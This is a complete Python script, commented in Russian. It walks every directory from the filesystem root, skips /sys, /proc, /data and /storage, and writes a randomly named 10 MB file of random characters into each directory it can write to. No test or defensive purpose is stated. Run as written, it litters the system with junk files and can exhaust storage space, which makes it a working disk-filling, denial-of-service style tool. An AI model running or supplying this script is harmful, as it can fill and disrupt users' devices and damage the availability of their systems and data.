import os
import random
import string
import traceback

def generate_random_data(size):
    """Генерирует случайные данные для файла"""
    try:
        return ''.join(random.choices(string.ascii_letters + string.digits, k=size))
    except Exception as e:
        print(f"Ошибка при генерации данных: {e}")
        traceback.print_exc()
        return ""

def create_large_file(file_path, file_size):
    """Создает файл заданного размера с рандомными данными и выводит путь к файлу"""
    try:
        with open(file_path, 'w') as f:
            f.write(generate_random_data(file_size))
        print(f"Файл создан: {file_path}")
    except Exception as e:
        print(f"Не удалось создать файл в {file_path}: {e}")
        traceback.print_exc()

def is_writable(directory):
    """Проверяет, доступна ли директория для записи"""
    try:
        return os.access(directory, os.W_OK)
    except Exception as e:
        print(f"Ошибка при проверке доступа к {directory}: {e}")
        traceback.print_exc()
        return False

def traverse_and_create_files(root_dir, file_size):
    """Обходит все директории и создает файлы размером file_size, проверяя права на запись"""
    try:
        for dirpath, dirnames, filenames in os.walk(root_dir):
            print(f"Проверка директории: {dirpath}")  # Выводим проверяемую директорию
            
            # Пропускаем системные директории или защищенные
            if '/sys/' in dirpath or '/proc/' in dirpath:
                continue
            
            # Пропускаем директории с ограничениями, такие как /data
            if '/data/' in dirpath or '/storage/' in dirpath:
                continue
            
            # Проверяем, есть ли права на запись в директорию
            if not is_writable(dirpath):
                print(f"Нет прав на запись в {dirpath}")  # Выводим, если нет прав на запись
                continue
            
            # Генерируем случайное имя файла
            random_file_name = ''.join(random.choices(string.ascii_letters + string.digits, k=10)) + '.txt'
            file_path = os.path.join(dirpath, random_file_name)
            
            # Создаем файл в доступных директориях
            create_large_file(file_path, file_size)
    except Exception as e:
        print(f"Ошибка в traverse_and_create_files: {e}")
        traceback.print_exc()

def main():
    try:
        file_size = 10 * 1024 * 1024  # 10 MB
        root_dir = "/"  # Начальная директория для обхода
        traverse_and_create_files(root_dir, file_size)
    except Exception as e:
        print(f"Ошибка в main: {e}")
        traceback.print_exc()

if __name__ == "__main__":
    main()
